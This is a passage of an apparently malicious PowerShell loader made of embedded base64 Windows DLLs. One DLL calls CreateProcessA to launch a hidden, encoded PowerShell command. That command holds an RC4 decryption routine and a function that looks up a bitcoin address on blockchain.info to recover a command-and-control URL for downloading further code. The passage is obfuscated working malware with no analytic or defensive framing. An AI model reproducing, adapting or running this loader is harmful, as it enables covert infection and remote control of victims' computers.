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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAGAAAAPCg+KAAoQihEKFooXChAAAAMAAAGAAAAMij4KPoo3CkiKSQpJikoKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
    } Else {
        $encoded_dll = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGDcAACY3AABYOQAAQjkAACg5AAASOQAA/DgAAOI4AADGOAAAsjgAAJ44AACAOAAAZDgAAAAAAABmNwAAcDcAAEY3AAAAAAAAODgAALY3AACoNwAAnDcAAOI3AAAEOAAAIDgAAMg3AAAAAAAA5BoAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBAABBwQAAQAAAAAC9kIC9jIHBvd2Vyc2hlbGwuZXhlIC1ub3AgLWVuYyBKQUJGQUQwQWV3QWtBRVFBTEFBa0FFc0FQUUFrQUVFQWNnQm5BSE1BT3dBa0FFb0FQUUF3QURzQUpBQlRBRDBBTUFBdUFDNEFNZ0ExQURVQU93QXdBQzRBTGdBeUFEVUFOUUI4QUNVQWV3QWtBRW9BUFFBb0FDUUFTZ0FyQUNRQVV3QmJBQ1FBWHdCZEFDc0FKQUJMQUZzQUpBQmZBQ1VBSkFCTEFDNEFUQUJsQUc0QVp3QjBBR2dBWFFBcEFDVUFNZ0ExQURZQU93QWtBRk1BV3dBa0FGOEFYUUFzQUNRQVV3QmJBQ1FBU2dCZEFEMEFKQUJUQUZzQUpBQktBRjBBTEFBa0FGTUFXd0FrQUY4QVhRQjlBRHNBSkFCSkFEMEFKQUJLQUQwQU1BQTdBQ1FBU0FBOUFEQUFPd0FrQUVRQWZBQWxBSHNBSkFCSkFEMEFLQUFrQUVrQUt3QXhBQ2tBSlFBeUFEVUFOZ0E3QUNRQVNBQTlBQ2dBSkFCSUFDc0FKQUJUQUZzQUpBQkpBRjBBS1FBbEFESUFOUUEyQURzQUpBQlRBRnNBSkFCSkFGMEFMQUFrQUZNQVd3QWtBRWdBWFFBOUFDUUFVd0JiQUNRQVNBQmRBQ3dBSkFCVEFGc0FKQUJKQUYwQU93QWtBRjhBTFFCaUFIZ0Fid0J5QUNRQVV3QmJBQ2dBSkFCVEFGc0FKQUJKQUYwQUt3QWtBRk1BV3dBa0FFZ0FYUUFwQUNVQU1nQTFBRFlBWFFCOUFIMEFDZ0JtQUhVQWJnQmpBSFFBYVFCdkFHNEFJQUJIQUdVQWRBQXRBRU1BUXdCVkFISUFiQUFnQUhzQUNnQUpBQ1FBUXdCeUFIa0FjQUIwQUc4QVFRQmtBR1FBY2dCbEFITUFjd0FnQUQwQUlBQWlBR0lBWXdBeEFIRUFZUUJoQUdRQU13QnhBRzBBWmdCcUFEY0FOUUJ0QURNQU53QTFBSFlBYUFCb0FHd0FjZ0F6QURjQU5BQXpBRzRBY2dCdEFEZ0FOQUIyQUdVQWN3QjVBSGdBWVFCb0FIZ0FOQUE1QUNJQUNnQUpBQ1FBUWdCc0FHOEFZd0JyQUVNQWFBQmhBR2tBYmdCVkFISUFiQUFnQUQwQUlBQWlBR2dBZEFCMEFIQUFjd0E2QUM4QUx3QmlBR3dBYndCakFHc0FZd0JvQUdFQWFRQnVBQzRBYVFCdUFHWUFid0F2QUhJQVlRQjNBR0VBWkFCa0FISUFMd0FpQUNBQUt3QWdBQ1FBUXdCeUFIa0FjQUIwQUc4QVFRQmtBR1FBY2dCbEFITUFjd0FnQUNzQUlBQWlBRDhBYkFCcEFHMEFhUUIwQUQwQU1RQWlBQW9BQ1FBa0FGUUFUQUJUQURFQU1RQkJBSFlBWVFCcEFHd0FJQUE5QUNBQUtBQmJBR1VBYmdCMUFHMEFYUUE2QURvQVJ3QmxBSFFBVGdCaEFHMEFaUUJ6QUNnQVd3QlRBSGtBY3dCMEFHVUFiUUF1QUU0QVpRQjBBQzRBVXdCbEFHTUFkUUJ5QUdrQWRBQjVBRkFBY2dCdkFIUUFid0JqQUc4QWJBQlVBSGtBY0FCbEFGMEFLUUFwQUNBQUxRQmpBRzhBYmdCMEFHRUFhUUJ1QUhNQUlBQWlBRlFBYkFCekFERUFNUUFpQUFvQUNRQnBBR1lBSUFBb0FDUUFWQUJNQUZNQU1RQXhBRUVBZGdCaEFHa0FiQUFwQUNBQWV3QUtBQWtBQ1FCYkFFNEFaUUIwQUM0QVV3QmxBSElBZGdCcEFHTUFaUUJRQUc4QWFRQnVBSFFBVFFCaEFHNEFZUUJuQUdVQWNnQmRBRG9BT2dCVEFHVUFZd0IxQUhJQWFRQjBBSGtBVUFCeUFHOEFkQUJ2QUdNQWJ3QnNBQ0FBUFFBZ0FGc0FUZ0JsQUhRQUxnQlRBR1VBWXdCMUFISUFhUUIwQUhrQVVBQnlBRzhBZEFCdkFHTUFid0JzQUZRQWVRQndBR1VBWFFBNkFEb0FWQUJzQUhNQU1RQXpBQ0FBTFFCaUFHOEFjZ0FnQUZzQVRnQmxBSFFBTGdCVEFHVUFZd0IxQUhJQWFRQjBBSGtBVUFCeUFHOEFkQUJ2QUdNQWJ3QnNBRlFBZVFCd0FHVUFYUUE2QURvQVZBQnNBSE1BTVFBeUFDQUFMUUJpQUc4QWNnQWdBRnNBVGdCbEFIUUFMZ0JUQUdVQVl3QjFBSElBYVFCMEFIa0FVQUJ5QUc4QWRBQnZBR01BYndCc0FGUUFlUUJ3QUdVQVhRQTZBRG9BVkFCc0FITUFNUUF4QUFvQUNRQUpBQ1FBVndCbEFHSUFRd0JzQUdrQVpRQnVBSFFBSUFBOUFDQUFUZ0JsQUhjQUxRQlBBR0lBYWdCbEFHTUFkQUFnQUZNQWVRQnpBSFFBWlFCdEFDNEFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQUtBQWtBQ1FBa0FGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFDNEFTQUJsQUdFQVpBQmxBSElBY3dBdUFFRUFaQUJrQUNnQUlnQlZBSE1BWlFCeUFDMEFRUUJuQUdVQWJnQjBBQ0lBTEFBZ0FDUUFWUUJCQUNrQUNnQUpBQWtBSkFCU0FHVUFjd0J3QUc4QWJnQnpBR1VBSUFBOUFDQUFKQUJYQUdVQVlnQkRBR3dBYVFCbEFHNEFkQUF1QUVRQWJ3QjNBRzRBYkFCdkFHRUFaQUJUQUhRQWNnQnBBRzRBWndBb0FDUUFRZ0JzQUc4QVl3QnJBRU1BYUFCaEFHa0FiZ0JWQUhJQWJBQXBBQW9BQ1FCOUFDQUFaUUJzQUhNQVpRQWdBSHNBQ2dBSkFBa0FKQUJYQUdrQWJnQklBSFFBZEFCd0FDQUFQUUFnQUU0QVpRQjNBQzBBVHdCaUFHb0FaUUJqQUhRQUlBQXRBRU1BYndCdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVndCcEFHNEFTQUIwQUhRQWNBQXVBRmNBYVFCdUFFZ0FkQUIwQUhBQVVnQmxBSEVBZFFCbEFITUFkQUF1QURVQUxnQXhBQW9BQ1FBSkFDUUFWd0JwQUc0QVNBQjBBSFFBY0FBdUFFOEFjQUJsQUc0QUtBQWlBRWNBUlFCVUFDSUFMQUFnQUNRQVFnQnNBRzhBWXdCckFFTUFhQUJoQUdrQWJnQlZBSElBYkFBc0FDQUFKQUJtQUdFQWJBQnpBR1VBS1FBS0FBa0FDUUFrQUZjQWFRQnVBRWdBZEFCMEFIQUFMZ0JUQUdVQWRBQlNBR1VBY1FCMUFHVUFjd0IwQUVnQVpRQmhBR1FBWlFCeUFDZ0FJZ0JWQUhNQVpRQnlBQzBBUVFCbkFHVUFiZ0IwQUNJQUxBQWdBQ1FBVlFCQkFDa0FDZ0FKQUFrQUpBQlhBR2tBYmdCSUFIUUFkQUJ3QUM0QVV3QmxBRzRBWkFBb0FDa0FDZ0FKQUFrQUpBQlNBR1VBY3dCd0FHOEFiZ0J6QUdVQUlBQTlBQ0FBSkFCWEFHa0FiZ0JJQUhRQWRBQndBQzRBVWdCbEFITUFjQUJ2QUc0QWN3QmxBRlFBWlFCNEFIUUFDZ0FKQUgwQUNnQUpBQ1FBVWdCbEFITUFjQUJ2QUc0QWN3QmxBRTBBWVFCMEFHTUFhQUFnQUQwQUlBQWtBRklBWlFCekFIQUFid0J1QUhNQVpRQWdBQzBBYlFCaEFIUUFZd0JvQUNBQUp3QWlBSE1BWXdCeUFHa0FjQUIwQUNJQU9nQWlBRFlBWVFBb0FGd0Fkd0FxQUNrQUp3QWdBSHdBSUFBbEFDQUFld0FrQUUwQVlRQjBBR01BYUFCbEFITUFXd0F4QUYwQWZRQUtBQWtBSkFCVkFGSUFUQUJJQUdVQWVBQWdBRDBBSUFBa0FGSUFaUUJ6QUhBQWJ3QnVBSE1BWlFCTkFHRUFkQUJqQUdnQUxnQlRBSFVBWWdCekFIUUFjZ0JwQUc0QVp3QW9BRElBTEFBZ0FDUUFVZ0JsQUhNQWNBQnZBRzRBY3dCbEFFMEFZUUIwQUdNQWFBQXVBRXdBWlFCdUFHY0FkQUJvQUNBQUxRQWdBRElBS1FBS0FBa0FKQUJEQUdrQWNBQm9BR1VBY2dBZ0FEMEFJQUJiQUdJQWVRQjBBR1VBV3dCZEFGMEFJQUF0QUhNQWNBQnNBR2tBZEFBZ0FDZ0FKQUJWQUZJQVRBQklBR1VBZUFBZ0FDMEFjZ0JsQUhBQWJBQmhBR01BWlFBZ0FDY0FMZ0F1QUNjQUxBQWdBQ2NBTUFCNEFDUUFKZ0FnQUNjQUtRQUtBQWtBSkFCTEFHVUFlUUFnQUQwQUlBQW9BREFBZUFCRUFFVUFMQUFnQURBQWVBQkdBRUVBTEFBZ0FEQUFlQUJEQUVVQUtRQUtBQWtBSkFCVkFGSUFUQ